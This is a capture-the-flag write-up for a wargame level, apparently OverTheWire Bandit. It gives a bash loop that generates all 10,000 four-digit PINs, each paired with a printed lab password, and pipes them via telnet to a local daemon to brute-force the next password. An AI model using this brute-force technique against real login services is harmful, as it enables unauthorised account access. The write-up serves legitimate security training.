description:
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

solution:
Ive listed all possible combinations in one file by script

*#!/bin/bash
for i in {0..9}{0..9}{0..9}{0..9}
do
        echo 'VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar '$i >> combinations.txt
done
*
then, I've used 
*cat combinations.txt | telnet localhost 30002 >> solution.txt*

at the end of solution.txt I've found the answer
